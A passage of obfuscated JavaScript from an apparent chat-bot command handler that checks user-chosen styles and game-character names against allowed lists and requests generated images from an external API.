04(0x26b1)],'wisp-4',_0x240d04(0xece),_0x240d04(0x99e),_0x1ce978['oLRqp'],_0x1ce978['GPOEY'],_0x1ce978['vhFtF'],_0x1ce978[_0x240d04(0x171a)],_0x1ce978[_0x240d04(0x124d)],'qi',_0x1ce978[_0x240d04(0x16b9)],_0x1ce978[_0x240d04(0x1f50)],_0x1ce978[_0x240d04(0x23c1)],_0x1ce978[_0x240d04(0x26af)],_0x240d04(0x1719),_0x1ce978[_0x240d04(0x180b)],_0x1ce978[_0x240d04(0x1c4c)],_0x1ce978[_0x240d04(0xa78)],_0x1ce978['EqRou'],_0x1ce978['ATinY'],_0x1ce978[_0x240d04(0x115d)],_0x240d04(0x1c9f),_0x1ce978[_0x240d04(0x2c5)],_0x1ce978[_0x240d04(0x1b4b)],_0x1ce978[_0x240d04(0x19dd)],_0x1ce978[_0x240d04(0x17a5)],_0x1ce978[_0x240d04(0x2738)],_0x1ce978[_0x240d04(0x1270)],_0x240d04(0xb59),_0x240d04(0x198b),_0x1ce978[_0x240d04(0x1e36)],_0x1ce978[_0x240d04(0x1e8b)],'liliana-6',_0x1ce978[_0x240d04(0x2b0c)],_0x240d04(0x1163),_0x240d04(0x1ccd),_0x1ce978[_0x240d04(0x219c)],_0x1ce978['MolbG'],_0x1ce978[_0x240d04(0xe57)],_0x240d04(0x102b),_0x1ce978['TlhXJ'],_0x1ce978['YFNCs'],'zanis',_0x1ce978[_0x240d04(0x138a)],_0x1ce978[_0x240d04(0x55d)],_0x240d04(0x1384),_0x1ce978['ktLbk'],_0x1ce978[_0x240d04(0x91c)],_0x1ce978[_0x240d04(0xb9f)],_0x1ce978[_0x240d04(0x1095)],_0x240d04(0x1b56),'thane',_0x1ce978[_0x240d04(0x2493)],_0x1ce978[_0x240d04(0x181d)],_0x1ce978['DSije'],_0x1ce978[_0x240d04(0xa79)],_0x1ce978[_0x240d04(0x1164)],_0x240d04(0x216b),_0x1ce978[_0x240d04(0x2e07)],_0x240d04(0x245d),'kahlii',_0x1ce978[_0x240d04(0x1161)],'fennik',_0x1ce978[_0x240d04(0x2718)],_0x1ce978[_0x240d04(0xd05)],_0x1ce978[_0x240d04(0x1cda)],_0x1ce978[_0x240d04(0x2e1f)],_0x1ce978['yprDv'],_0x1ce978[_0x240d04(0x2a9d)],_0x1ce978['ATxaG'],_0x1ce978[_0x240d04(0x28f1)],_0x1ce978['TTYJR'],_0x1ce978[_0x240d04(0x1feb)],_0x1ce978[_0x240d04(0x827)],_0x1ce978['ANFOf'],_0x1ce978[_0x240d04(0xdeb)],_0x1ce978[_0x240d04(0x2c75)],_0x1ce978[_0x240d04(0x42b)],_0x240d04(0x1823),_0x240d04(0x168e),_0x1ce978[_0x240d04(0x27ef)],_0x1ce978['VfyWy'],_0x1ce978[_0x240d04(0x2880)],_0x1ce978[_0x240d04(0x220b)],_0x1ce978[_0x240d04(0x2c25)],_0x1ce978['zNJUl'],_0x1ce978['UGrcQ'],_0x1ce978['MDEdJ'],'butterfly-'+'3',_0x1ce978['qFOXD'],_0x240d04(0x857),_0x1ce978['ckLeI'],_0x1ce978['vZkqn'],_0x1ce978['rxhMU'],_0x1ce978[_0x240d04(0x2a3a)],_0x1ce978[_0x240d04(0xb47)],_0x1ce978[_0x240d04(0x1fb9)],_0x1ce978[_0x240d04(0x183)],_0x1ce978[_0x240d04(0x95d)],_0x1ce978[_0x240d04(0x1ce1)],_0x1ce978[_0x240d04(0x1e65)],_0x1ce978[_0x240d04(0x2039)],_0x1ce978[_0x240d04(0x2054)],_0x1ce978[_0x240d04(0x25db)],_0x1ce978[_0x240d04(0x1717)],_0x1ce978['ZhEnS'],_0x1ce978[_0x240d04(0x358)],_0x1ce978[_0x240d04(0x1708)],_0x240d04(0x1b1a),_0x1ce978[_0x240d04(0x1381)],_0x1ce978[_0x240d04(0x753)],_0x240d04(0x2ef2),_0x1ce978[_0x240d04(0xb0b)],_0x1ce978['xEyXC'],_0x240d04(0x100a),_0x1ce978['BpLXA'],_0x1ce978[_0x240d04(0x508)],_0x1ce978[_0x240d04(0x9e1)],_0x1ce978[_0x240d04(0x1693)],_0x1ce978['lijRE'],_0x1ce978[_0x240d04(0x269e)],_0x1ce978[_0x240d04(0x25c5)],_0x1ce978['oqVwg'],_0x1ce978[_0x240d04(0x566)],_0x240d04(0x1d02),'arthur',_0x240d04(0x9fe),_0x1ce978[_0x240d04(0x159b)],_0x1ce978['qCGBs'],_0x1ce978[_0x240d04(0x1a61)],_0x1ce978[_0x240d04(0x2a81)],_0x1ce978[_0x240d04(0x1682)],_0x1ce978['iuyIb'],_0x1ce978['zocxs'],_0x1ce978[_0x240d04(0x147e)],'azzenka-2',_0x1ce978['gTNEq'],_0x1ce978[_0x240d04(0x838)],_0x1ce978['hLRkp'],'lubu-4',_0x240d04(0x26dd),_0x1ce978[_0x240d04(0xc92)],_0x1ce978[_0x240d04(0x18b9)],_0x1ce978[_0x240d04(0x560)],_0x1ce978[_0x240d04(0xac2)],_0x1ce978[_0x240d04(0x1958)],_0x240d04(0x28e4),_0x1ce978['daxkD'],_0x1ce978[_0x240d04(0x23ce)],_0x1ce978[_0x240d04(0x177e)],_0x1ce978[_0x240d04(0x1151)],_0x1ce978[_0x240d04(0x286)],_0x240d04(0x1684),_0x1ce978['epTYu'],_0x1ce978['ULBVf'],_0x1ce978[_0x240d04(0x12ea)],_0x1ce978[_0x240d04(0x8ec)],_0x1ce978[_0x240d04(0x17e7)],_0x1ce978['ATMgZ'],_0x1ce978[_0x240d04(0x3aa)],'wonderwoma'+_0x240d04(0x1874),_0x1ce978[_0x240d04(0x145c)],_0x240d04(0x739),_0x1ce978[_0x240d04(0x73f)],_0x1ce978['lyqTS'],_0x1ce978[_0x240d04(0x2099)],_0x1ce978[_0x240d04(0x1b2c)],_0x1ce978['OFjae'],_0x1ce978[_0x240d04(0x1d7c)],'airi-5',_0x240d04(0x1664),_0x1ce978[_0x240d04(0x16f6)],_0x1ce978[_0x240d04(0xdec)],_0x1ce978[_0x240d04(0x595)],_0x1ce978[_0x240d04(0xcb0)],_0x1ce978[_0x240d04(0xfa2)],'grakk-3',_0x1ce978[_0x240d04(0x1d3d)],_0x1ce978[_0x240d04(0xa52)],_0x1ce978[_0x240d04(0x4ba)],_0x1ce978[_0x240d04(0x27f)],_0x240d04(0x2332),_0x1ce978[_0x240d04(0x1adf)],_0x1ce978[_0x240d04(0x2b0e)],_0x1ce978[_0x240d04(0x21b2)],_0x1ce978[_0x240d04(0x2125)],_0x240d04(0x1838),_0x1ce978[_0x240d04(0x2c09)],_0x1ce978[_0x240d04(0x27c0)],_0x240d04(0x1113),_0x1ce978[_0x240d04(0x2292)],_0x1ce978[_0x240d04(0xc9b)],_0x1ce978[_0x240d04(0x2844)],_0x1ce978[_0x240d04(0x9c4)],_0x1ce978['KgEef'],_0x1ce978['jTMfy'],_0x1ce978['JLnEF'],_0x1ce978[_0x240d04(0x1daf)],_0x1ce978['IJXJj'],_0x1ce978[_0x240d04(0x1f8c)],_0x1ce978[_0x240d04(0x125d)],_0x1ce978[_0x240d04(0x2421)],_0x1ce978[_0x240d04(0x12ce)],_0x1ce978[_0x240d04(0x2e53)],_0x1ce978['PVyEF'],_0x1ce978['jFqQD'],_0x1ce978[_0x240d04(0xa8a)],_0x1ce978[_0x240d04(0x10f6)],_0x1ce978[_0x240d04(0x1988)],_0x1ce978[_0x240d04(0x1db2)],_0x1ce978[_0x240d04(0x2a49)],'aleister-3',_0x1ce978[_0x240d04(0x298e)],_0x1ce978[_0x240d04(0x1d01)],_0x1ce978['nrPVr'],_0x1ce978[_0x240d04(0x2048)],_0x240d04(0x712),_0x1ce978[_0x240d04(0xa2c)],_0x1ce978[_0x240d04(0x22dd)],_0x1ce978[_0x240d04(0x2b11)],_0x1ce978[_0x240d04(0x1de7)],_0x240d04(0xebf),_0x1ce978[_0x240d04(0x157)],_0x1ce978[_0x240d04(0x10a3)],_0x1ce978['AIuLp'],_0x1ce978[_0x240d04(0x277e)],_0x240d04(0x1f91),_0x1ce978[_0x240d04(0x182b)],_0x1ce978[_0x240d04(0x8fb)],_0x1ce978[_0x240d04(0x23f3)],_0x1ce978['qYqnM'],_0x1ce978[_0x240d04(0x175e)],_0x1ce978[_0x240d04(0x111d)],_0x1ce978[_0x240d04(0x19a9)],_0x1ce978[_0x240d04(0x13d7)],_0x1ce978[_0x240d04(0x24b8)],_0x1ce978['lypjU'],_0x1ce978[_0x240d04(0x170e)],_0x1ce978['YTcUd'],'baldum',_0x1ce978['wtuIl'],_0x1ce978[_0x240d04(0x20f9)],_0x240d04(0x2951),_0x1ce978[_0x240d04(0x1cdb)],_0x1ce978['uedmy'],_0x1ce978[_0x240d04(0x556)],_0x1ce978['bPgpW'],_0x1ce978[_0x240d04(0x259a)],_0x1ce978[_0x240d04(0x1751)],_0x1ce978[_0x240d04(0xcf9)],_0x1ce978[_0x240d04(0x1939)],_0x1ce978[_0x240d04(0x1ee5)],_0x1ce978[_0x240d04(0xafa)],_0x1ce978[_0x240d04(0x14e)],_0x1ce978[_0x240d04(0x29a)],_0x1ce978[_0x240d04(0xe1)],_0x1ce978[_0x240d04(0x2c9c)],'veera-5',_0x1ce978['cckSK'],_0x1ce978[_0x240d04(0x29a4)],_0x1ce978['fYjjo'],_0x1ce978['UDhJj'],_0x1ce978[_0x240d04(0xb76)],_0x1ce978[_0x240d04(0xa53)],_0x1ce978[_0x240d04(0x653)],_0x1ce978[_0x240d04(0x22d7)],_0x1ce978['TcnMx'],_0x1ce978[_0x240d04(0x1026)],_0x1ce978[_0x240d04(0x2557)],_0x1ce978[_0x240d04(0x2edf)],_0x240d04(0x10d4),_0x1ce978[_0x240d04(0x103f)],_0x1ce978['KiRiR'],_0x1ce978[_0x240d04(0x277a)],_0x1ce978['DxWmd'],_0x1ce978[_0x240d04(0x2bf2)],'sephera-2',_0x240d04(0x2253),_0x240d04(0x192f),_0x240d04(0x2265),_0x240d04(0x2624),_0x1ce978['lvFix'],_0x1ce978['otjsT'],_0x1ce978[_0x240d04(0x139f)],_0x1ce978[_0x240d04(0x146a)],_0x240d04(0x1dcd)+'-2',_0x240d04(0x1dcd),_0x1ce978[_0x240d04(0x1b2d)],_0x1ce978[_0x240d04(0x2556)],_0x1ce978[_0x240d04(0x23d5)],_0x240d04(0x2305),_0x240d04(0x1b75),_0x1ce978[_0x240d04(0x1e88)],_0x240d04(0x1dc5),_0x1ce978[_0x240d04(0xc5a)],_0x1ce978[_0x240d04(0x2cff)],_0x240d04(0x2651),_0x1ce978['tRZsw'],_0x240d04(0x28cf),_0x1ce978[_0x240d04(0x3c5)],_0x240d04(0x1ace),_0x1ce978[_0x240d04(0xd60)],_0x240d04(0x2977),_0x1ce978[_0x240d04(0x2bc0)],_0x1ce978[_0x240d04(0x88f)],_0x240d04(0x1f4c),_0x240d04(0x1f32),_0x1ce978[_0x240d04(0x135d)],_0x240d04(0x7c3),_0x1ce978[_0x240d04(0x2293)],_0x1ce978['wvUHt'],_0x1ce978[_0x240d04(0x2ca9)],_0x1ce978['xDPas'],_0x1ce978[_0x240d04(0x24a)],_0x1ce978[_0x240d04(0x1264)],_0x240d04(0xb11),_0x1ce978[_0x240d04(0x262f)],_0x1ce978[_0x240d04(0x2966)],_0x1ce978[_0x240d04(0x2b1a)],_0x240d04(0x2d09),_0x1ce978[_0x240d04(0x26fe)],'omen-4','lindis-4','liliana-5',_0x1ce978[_0x240d04(0x270e)],_0x1ce978['tRsqu'],_0x1ce978['RCgqv'],_0x1ce978[_0x240d04(0x536)],_0x1ce978['ZCszF'],_0x1ce978[_0x240d04(0x2376)],_0x240d04(0x170f),_0x1ce978[_0x240d04(0x1bbf)],_0x1ce978[_0x240d04(0x1212)],_0x1ce978[_0x240d04(0x1b39)],_0x1ce978[_0x240d04(0x9f1)],_0x240d04(0xfc0),_0x1ce978[_0x240d04(0x18d0)],_0x1ce978['bBcvh']];if(!_0x375fbf[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x1b83)]===_0x240d04(0xcfa))return _0x1ce978['KsuAw'](_0x4f12f4,_0x240d04(0x1491)+_0x240d04(0x1bcf)+_0x240d04(0x2357)+_0x240d04(0x1406)+_0x240d04(0xbd4)+_0x240d04(0x1a7a));else _0x555a99(_0x375fbf,_0x375fbf[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x8ca)]);}else{if(_0x1ce978['IQnwY'](_0x1ce978[_0x240d04(0x2d60)],_0x1ce978['qESrk'])){_0x1ce978['ACUWE'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x3b45f1=_0x1ce978[_0x240d04(0x29da)](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x2538)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'avatar':_0x83dd4c},'apikey'),_0x398720=await _0x1ce978[_0x240d04(0x6cf)](fetch,_0x3b45f1);if(!_0x398720['ok'])throw await _0x398720[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x3b45f1},{'caption':lang['ok']});}else return _0x1ce978[_0x240d04(0x20f6)](_0x261ab1,_0x1ce978['KdBjs']);}}}break;case _0x1ce978[_0x240d04(0x2f2)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+_0x240d04(0x2df2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cc8)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2db8)](_0x1ec495,_0x3e6565)+('\x20teks|styl'+'e`\x0a\x0aContoh'+_0x240d04(0x2890)+_0x240d04(0x2df2))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2cc8)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x1f491e=[_0x1ce978[_0x240d04(0x18bd)],_0x1ce978[_0x240d04(0x2864)],_0x1ce978[_0x240d04(0x1a80)],_0x240d04(0x1aae),_0x1ce978[_0x240d04(0x380)],_0x1ce978[_0x240d04(0xee1)],_0x1ce978[_0x240d04(0xb4d)],_0x1ce978[_0x240d04(0x213)],_0x1ce978[_0x240d04(0x2637)],_0x1ce978[_0x240d04(0x1483)],_0x1ce978[_0x240d04(0x1f60)],_0x240d04(0x1f5d),_0x1ce978['ETtHt'],_0x1ce978[_0x240d04(0x1022)],_0x1ce978[_0x240d04(0x1300)],_0x1ce978[_0x240d04(0x2d93)],_0x1ce978[_0x240d04(0x1ef8)],_0x1ce978[_0x240d04(0x69e)],_0x1ce978[_0x240d04(0x28f7)],_0x240d04(0x1ca2),_0x1ce978[_0x240d04(0x27e1)],'zilean',_0x1ce978['XZjBX'],_0x1ce978[_0x240d04(0x2e90)],_0x1ce978[_0x240d04(0x10b5)],_0x1ce978[_0x240d04(0x2a6)],_0x1ce978[_0x240d04(0x53a)],_0x240d04(0xf87),_0x1ce978[_0x240d04(0xf77)],_0x240d04(0x16fc),_0x240d04(0x1384),_0x1ce978[_0x240d04(0x19d4)],_0x1ce978[_0x240d04(0x1ec9)],_0x1ce978['VYSsn'],'viktor','vi',_0x240d04(0x2b55),_0x1ce978['ZCwLt'],_0x1ce978['sIdBt'],_0x240d04(0x2dc4),_0x1ce978['Olgpl'],_0x1ce978['lPtOg'],_0x1ce978[_0x240d04(0xdc6)],_0x1ce978[_0x240d04(0x1f78)],_0x1ce978[_0x240d04(0x2b7a)],_0x1ce978['xVQlx'],_0x1ce978[_0x240d04(0x1d54)],'thresh',_0x1ce978[_0x240d04(0x230e)],_0x1ce978[_0x240d04(0x987)],_0x1ce978['AKqeK'],_0x1ce978['Xcnin'],_0x1ce978['OJuZr'],_0x240d04(0x2a33),_0x1ce978[_0x240d04(0x7d0)],_0x1ce978['mxPTj'],_0x1ce978['Invhd'],_0x1ce978['xTAVQ'],_0x1ce978[_0x240d04(0x1527)],_0x1ce978[_0x240d04(0x1afc)],_0x1ce978[_0x240d04(0x4c5)],_0x1ce978[_0x240d04(0x1ecb)],_0x1ce978[_0x240d04(0xe87)],_0x1ce978[_0x240d04(0x50a)],_0x1ce978[_0x240d04(0x662)],_0x1ce978[_0x240d04(0xd5d)],_0x1ce978[_0x240d04(0x747)],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978['qKJvH'],_0x1ce978['XibAt'],_0x1ce978['CxosQ'],_0x240d04(0x2471),_0x1ce978[_0x240d04(0x1315)],_0x1ce978['ERDhH'],'poppy',_0x240d04(0x1ebc),_0x240d04(0x20e4),_0x1ce978[_0x240d04(0x1590)],_0x240d04(0xaba),_0x240d04(0x211b),_0x1ce978[_0x240d04(0x763)],_0x1ce978[_0x240d04(0x2cde)],_0x240d04(0x16a1),'nasus',_0x1ce978[_0x240d04(0x2274)],_0x1ce978[_0x240d04(0x280a)],_0x240d04(0x2015)+'er',_0x1ce978[_0x240d04(0xdd6)],_0x1ce978['dwiJa'],_0x240d04(0x496),_0x240d04(0x1647),_0x1ce978['lqGDx'],_0x1ce978['eaPYJ'],_0x240d04(0xd92),_0x1ce978['KKUDU'],_0x1ce978[_0x240d04(0x10ba)],_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0x1a6d)],_0x1ce978['ctfAs'],_0x1ce978[_0x240d04(0x2507)],_0x1ce978[_0x240d04(0x1d35)],_0x1ce978[_0x240d04(0x2a89)],_0x1ce978[_0x240d04(0x3b2)],_0x240d04(0x2d8f),_0x240d04(0x14ca),_0x1ce978['nuEXi'],_0x1ce978[_0x240d04(0x24d5)],_0x1ce978[_0x240d04(0x1a75)],_0x1ce978[_0x240d04(0x3cb)],_0x1ce978['YHzxT'],'kaisa',_0x1ce978[_0x240d04(0x1845)],_0x1ce978[_0x240d04(0x9d2)],'jayce',_0x1ce978[_0x240d04(0x17c2)],_0x1ce978[_0x240d04(0x1279)],_0x1ce978[_0x240d04(0x2c1f)],_0x1ce978['YTEYV'],_0x1ce978['BcCqg'],_0x240d04(0x8e8),_0x240d04(0x1555)+'er',_0x1ce978[_0x240d04(0x11e3)],_0x1ce978[_0x240d04(0xf29)],_0x1ce978[_0x240d04(0x5eb)],_0x1ce978[_0x240d04(0x27c2)],_0x1ce978[_0x240d04(0xe0b)],_0x1ce978[_0x240d04(0x435)],_0x1ce978[_0x240d04(0x19ca)],_0x1ce978[_0x240d04(0x1e3d)],_0x1ce978[_0x240d04(0x1a06)],_0x1ce978[_0x240d04(0x2c23)],_0x1ce978[_0x240d04(0x28ca)],_0x1ce978[_0x240d04(0x18a3)],_0x240d04(0x2491),_0x1ce978[_0x240d04(0x2a78)],_0x1ce978[_0x240d04(0x1023)],_0x1ce978['lkOKr'],_0x1ce978[_0x240d04(0x2a9f)],_0x1ce978[_0x240d04(0x291b)],'chogath',_0x1ce978[_0x240d04(0x2e76)],_0x1ce978[_0x240d04(0x22bd)],_0x1ce978[_0x240d04(0x1ae1)],_0x1ce978[_0x240d04(0x41c)],_0x1ce978['HZXYO'],_0x1ce978[_0x240d04(0x1b4c)],_0x1ce978[_0x240d04(0x1195)],_0x1ce978['jzxpW'],_0x1ce978[_0x240d04(0x2dae)],_0x1ce978[_0x240d04(0x23a0)],_0x240d04(0x14e4),_0x1ce978['TKhxB'],_0x240d04(0x2199),_0x1ce978['JCXna'],_0x1ce978[_0x240d04(0x138c)],_0x1ce978['YtAhf'],_0x1ce978[_0x240d04(0x286c)],_0x240d04(0x1f48),_0x1ce978[_0x240d04(0x2b31)],_0x1ce978[_0x240d04(0x1203)],_0x240d04(0x1b79),'norgana-2',_0x1ce978[_0x240d04(0x1960)],_0x1ce978[_0x240d04(0x22ae)],_0x1ce978[_0x240d04(0x776)]];if(!_0x1f491e['includes'](_0x83dd4c))'XeoTr'!==_0x1ce978[_0x240d04(0x2742)]?_0x1ce978['cHWrH'](_0x555a99,_0x1f491e,_0x1f491e['length'],_0x1ce978[_0x240d04(0x1861)]):_0x1ce978[_0x240d04(0x136d)](_0x506664,_0x1ce978[_0x240d04(0xa98)](_0x1ce978[_0x240d04(0x2508)],_0x451230[_0x240d04(0x960)]));else{if(_0x1ce978[_0x240d04(0x1d91)]!==_0x1ce978[_0x240d04(0x1caf)]){_0x1ce978[_0x240d04(0x2d27)](_0x476bfb,lang['wait']);let _0x3dfce9=_0x1ce978[_0x240d04(0x2a4b)](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x2377)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x240d04(0x23aa)),_0x150ecc=await _0x1ce978[_0x240d04(0x29a2)](fetch,_0x3dfce9);if(!_0x150ecc['ok'])throw await _0x150ecc[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x3dfce9},{'caption':lang['ok']});}else return _0x1ce978[_0x240d04(0x2804)](_0x5a10ae,_0x1ce978[_0x240d04(0x257a)]);}}break;case _0x1ce978['fnfCK']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x297c)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1a5f)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['CaogP'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['BNZQS'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978['zLAnb'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1a5f)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x3b53a0=[_0x1ce978['tqZZU'],_0x1ce978[_0x240d04(0x2c79)],_0x1ce978[_0x240d04(0x420)],_0x1ce978[_0x240d04(0x238)],_0x1ce978[_0x240d04(0x20ea)],_0x1ce978[_0x240d04(0x2370)],_0x1ce978['RpbbY'],_0x1ce978[_0x240d04(0xed9)],'dx',_0x240d04(0x2481)+'e','omohswat','sfg',_0x1ce978[_0x240d04(0x28bf)],_0x240d04(0x142f),_0x1ce978[_0x240d04(0x2bbc)],_0x1ce978[_0x240d04(0x21a0)],_0x1ce978[_0x240d04(0x1d31)],_0x1ce978[_0x240d04(0x2c28)],_0x1ce978[_0x240d04(0x1082)],_0x1ce978[_0x240d04(0xf51)],_0x1ce978[_0x240d04(0x63b)],_0x1ce978[_0x240d04(0xb80)],_0x1ce978[_0x240d04(0x11c5)],_0x240d04(0x1d4f)+'r'];if(!_0x3b53a0[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978['GUFUY'](_0x555a99,_0x3b53a0,_0x3b53a0['length'],_0x240d04(0xc53));else{_0x1ce978[_0x240d04(0x257e)](_0x476bfb,lang['wait']);let _0xd83efe=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1e05)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0xbc7984=await _0x1ce978['kfykz'](fetch,_0xd83efe);if(!_0xbc7984['ok'])throw await _0xbc7984[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0xd83efe},{'caption':lang['ok']});}}break;case _0x240d04(0x592)+'er':{if(!_0x33cfb1)return _0x1ce978['EBYGh'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2ad2)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2b8)+'paper`\x0a\x0aCo'+_0x240d04(0x1f79)+_0x240d04(0x2a75))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xfd)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x13a4)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x2b8)+_0x240d04(0x2ace)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x23b5)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'fizz`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x5cf1cf=[_0x1ce978['bvabW'],_0x240d04(0x1526),_0x240d04(0x1757),_0x240d04(0x1aae),_0x1ce978[_0x240d04(0x41c)],_0x1ce978[_0x240d04(0x22bd)],_0x240d04(0x29b1),_0x240d04(0x189b),'fizz',_0x1ce978[_0x240d04(0x1bc9)],_0x1ce978[_0x240d04(0x1bef)],_0x1ce978[_0x240d04(0x2a3f)],_0x1ce978[_0x240d04(0x15da)],_0x1ce978[_0x240d04(0x380)],_0x1ce978[_0x240d04(0xee1)],_0x240d04(0x2710),_0x240d04(0x47f),_0x1ce978[_0x240d04(0x2052)],_0x240d04(0x1b79),_0x1ce978['geRim'],_0x1ce978[_0x240d04(0x2003)],_0x1ce978[_0x240d04(0x2b31)],_0x1ce978[_0x240d04(0x1f60)],_0x1ce978[_0x240d04(0xf97)],_0x1ce978[_0x240d04(0x13c0)],_0x1ce978[_0x240d04(0x1300)],_0x1ce978[_0x240d04(0x2e52)],_0x240d04(0x2d4e),_0x1ce978[_0x240d04(0x2896)],_0x240d04(0x8bf),_0x1ce978[_0x240d04(0x1ef8)],_0x1ce978['WtmAt'],_0x1ce978[_0x240d04(0xf7a)],_0x240d04(0x408),_0x1ce978[_0x240d04(0x1493)],_0x1ce978[_0x240d04(0x1bfe)],_0x1ce978[_0x240d04(0x1845)],_0x1ce978['ddECS'],_0x1ce978['kbJkr'],_0x1ce978[_0x240d04(0x2c1f)],_0x1ce978[_0x240d04(0x23a0)],_0x1ce978[_0x240d04(0x860)],_0x1ce978[_0x240d04(0x2964)],_0x1ce978['XzzLz'],_0x1ce978[_0x240d04(0x169b)],_0x1ce978[_0x240d04(0x2a45)],_0x1ce978[_0x240d04(0x2529)],_0x240d04(0x10fd),'vi',_0x1ce978[_0x240d04(0x12f0)],_0x1ce978[_0x240d04(0x83b)],_0x1ce978[_0x240d04(0x2269)],_0x1ce978[_0x240d04(0x1527)],_0x1ce978[_0x240d04(0x1ecb)],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978[_0x240d04(0x256d)],_0x1ce978['NlsGD'],_0x1ce978[_0x240d04(0x280a)],_0x1ce978[_0x240d04(0x1a6d)],_0x240d04(0x1b6a),_0x1ce978[_0x240d04(0x3cb)],_0x1ce978[_0x240d04(0x1854)],_0x240d04(0xa4c),_0x1ce978[_0x240d04(0x2dce)],_0x240d04(0x968),_0x1ce978[_0x240d04(0x1ae1)],_0x1ce978['pWXPj'],_0x240d04(0x16fc),_0x240d04(0x382),_0x1ce978['Xcnin'],_0x1ce978[_0x240d04(0xe87)],_0x1ce978[_0x240d04(0x1315)],_0x1ce978['ZQGdU'],_0x240d04(0x21a1),_0x1ce978[_0x240d04(0xf1e)],_0x1ce978[_0x240d04(0xe7)],_0x1ce978['nuEXi'],_0x1ce978['YHzxT'],_0x240d04(0x299c),_0x1ce978[_0x240d04(0xba3)],_0x1ce978['lPtOg'],_0x240d04(0x205d),'tf',_0x1ce978['WcMmV'],_0x1ce978[_0x240d04(0xd5d)],_0x1ce978['FpuMD'],_0x1ce978[_0x240d04(0x62d)],_0x1ce978[_0x240d04(0x1f46)],_0x1ce978['LSQAQ'],_0x1ce978[_0x240d04(0x2a9f)],_0x1ce978['daxmS'],_0x1ce978[_0x240d04(0x138c)],_0x1ce978['JmsBF'],_0x1ce978[_0x240d04(0x2cd8)],_0x1ce978[_0x240d04(0x2a6)],'warwick',_0x1ce978[_0x240d04(0x26ab)],_0x1ce978[_0x240d04(0x1f7f)],_0x1ce978[_0x240d04(0x11e3)],'gangplank',_0x1ce978[_0x240d04(0x523)],_0x1ce978['XzGUo'],_0x1ce978[_0x240d04(0x2bb9)],_0x240d04(0x24ce),_0x240d04(0x2b55),_0x240d04(0x20c0),'rengar',_0x240d04(0x15bc),_0x1ce978[_0x240d04(0x1efd)],_0x1ce978['FthWX'],_0x1ce978[_0x240d04(0x1d35)],_0x240d04(0x4d3),_0x1ce978[_0x240d04(0x17c2)],_0x1ce978[_0x240d04(0x1fdf)],_0x1ce978[_0x240d04(0xe0b)],_0x1ce978[_0x240d04(0xb56)],_0x1ce978['YXfho'],_0x1ce978[_0x240d04(0x2507)],_0x1ce978[_0x240d04(0x75f)],_0x1ce978[_0x240d04(0x1d5f)],_0x1ce978[_0x240d04(0x177)],_0x1ce978[_0x240d04(0x18a3)],_0x1ce978[_0x240d04(0x2e76)],_0x1ce978['ECwMO'],_0x1ce978[_0x240d04(0xf77)],_0x1ce978[_0x240d04(0x65d)],_0x1ce978[_0x240d04(0x74f)],_0x1ce978['ZCwLt'],_0x1ce9